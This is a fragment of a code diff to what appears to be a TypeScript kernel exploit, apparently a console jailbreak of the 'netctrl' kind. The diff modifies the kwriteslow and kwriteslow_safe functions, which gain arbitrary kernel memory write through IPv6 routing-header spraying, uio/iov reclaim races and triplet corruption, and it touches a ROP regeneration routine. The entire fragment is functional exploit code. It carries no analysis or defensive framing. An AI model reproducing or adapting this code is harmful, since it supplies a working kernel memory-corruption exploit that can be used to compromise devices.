   write32(sockopt_val_buf, size)
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
-
-  // Set iov length.
   write64(uioIovWrite.add(0x08), size)
 
-  // Free first triplet.
   free_rthdr(ipv6_socks[triplets[1]])
 
-  // Minimize footprint
   const uio_leak_add = leak_rthdr.add(0x08)
 
-  // Reclaim with uio.
-  let zeroMemoryCount = 0
-  while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount++
-      if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount = 0
-    }
-    trigger_uio_readv() // COMMAND_UIO_WRITE in fl0w's
+  let count = 0
+  while (count < 12000) {
+    count++
+
+    trigger_uio_readv()
     sched_yield()
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
 
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      // debug("Break on reclaim with uio");
-      break
-    }
+    if (read32(uio_leak_add) === UIO_IOV_NUM) break
 
-    // Wake up all threads.
     for (let i = 0; i < UIO_THREAD_NUM; i++) {
       write(new BigInt(uio_sock_1), buffer, size)
     }
@@ -1987,80 +1914,37 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
     wait_uio_readv()
   }
 
-  const uio_iov = read64(leak_rthdr)
-  // debug("This is uio_iov: " + hex(uio_iov));
+  if (count >= 12000) {
+    log('[kwriteslow] FAILED reclaim')
+    return BigInt_Error
+  }
 
-  // Prepare uio reclaim buffer.
+  const uio_iov = read64(leak_rthdr)
   build_uio(msgIov, uio_iov, 0, false, addr, size)
 
-  // Free second one.
   free_rthdr(ipv6_socks[triplets[2]])
 
-  // Minimize footprint
   const iov_leak_add = leak_rthdr.add(0x20)
 
-  // Reclaim uio with iov.
-  let zeroMemoryCount2 = 0
+  let count2 = 0
   while (true) {
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount2 = 0
-    }
-    // Reclaim with iov.
+    count2++
+
     trigger_iov_recvmsg()
     sched_yield()
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
 
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      // debug("Break on reclaim uio with iov");
-      break
-    }
+    if (read32(iov_leak_add) === UIO_SYSSPACE) break
 
-    // Release iov spray.
     write(new BigInt(iov_sock_1), tmp, 1)
     wait_iov_recvmsg()
     read(new BigInt(iov_sock_0), tmp, 1)
   }
 
-  // Corrupt data.
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     write(new BigInt(uio_sock_1), buffer, size)
   }
-
-  // Find triplet.
-  triplets[1] = find_triplet(triplets[0], -1)
-
-  // Workers should have finished earlier no need to wait
-  wait_uio_readv()
-
-  // Release iov spray.
-  write(new BigInt(iov_sock_1), tmp, 1)
-
-  // Find triplet[2].
-  for (let retry = 0; retry < 3; retry++) {
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-    if (triplets[2] !== -1) break
-    sched_yield()
-  }
-
-  if (triplets[2] === -1) {
-    debug('kwriteslow - Failed to find triplets[2]')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-    return BigInt_Error
-  }
-
-  // Workers should have finished earlier no need to wait
-  wait_iov_recvmsg()
-  read(new BigInt(iov_sock_0), tmp, 1)
 
   return new BigInt(0)
 }
@@ -2069,22 +1953,31 @@ function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
 
 function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
   for (let attempt = 1; attempt <= MAX_KWRITE_FAIL; attempt++) {
+
+    if (debugging.info.memory.available === 0) {
+      log('[kwriteslow_safe] memory exhausted, delaying...')
+      nanosleep_fun(5_000_000)
+    }
+
     const ret = kwriteslow(addr, buffer, size)
 
     if (ret.eq(BigInt_Error)) {
-      
       kwriteslow_failures++
-      if (kwriteslow_failures >= 1 && worker_resets < MAX_WORKER_RESETS) {
+
+      log('[kwriteslow_safe] ERROR at ' + hex(addr) +
+          ' attempt ' + attempt + '/' + MAX_KWRITE_FAIL)
+
+      if (kwriteslow_failures >= 2 && worker_resets < MAX_WORKER_RESETS) {
         reset_workers()
+        nanosleep_fun(10_000_000)
       }
-      log('kwriteslow_safe: kwriteslow returned BigInt_Error at addr ' +
-          hex(addr) + ' (attempt ' + attempt + '/' + MAX_KWRITE_FAIL + ')')
+
+      dynamic_delay(5_000_000, kwriteslow_failures)
 
       if (cleanup_called) {
         throw new Error('Netctrl failed - Reboot and try again')
       }
 
-      dynamic_delay(5_000_000, kwriteslow_failures)
       continue
     }
 
@@ -2095,6 +1988,7 @@ function kwriteslow_safe (addr: BigInt, buffer: BigInt, size: number): BigInt {
   cleanup()
   throw new Error('Netctrl failed - Reboot and try again')
 }
+
 
 function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
   let new_rop_entry = last_rop_entry.add(8)
